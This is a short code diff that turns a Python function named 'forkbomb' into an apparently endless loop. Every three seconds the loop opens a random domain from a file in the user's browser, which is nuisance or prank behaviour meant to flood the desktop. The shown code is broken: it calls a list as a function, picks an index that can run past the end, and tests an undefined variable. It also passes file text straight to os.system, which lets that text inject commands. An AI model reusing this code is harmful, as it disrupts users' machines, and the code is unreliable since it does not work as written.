@@ -4,6 +4,7 @@ def forkbomb():
   number = 0
   file = open("domains.txt", "r")
   content = file.readlines()
-  for line in content:
+  while mal == True:
+    line = random.randint(0, len(content))
     time.sleep(3)
-    os.system("xdg-open https://" + line)
+    os.system("xdg-open https://" + content(line))
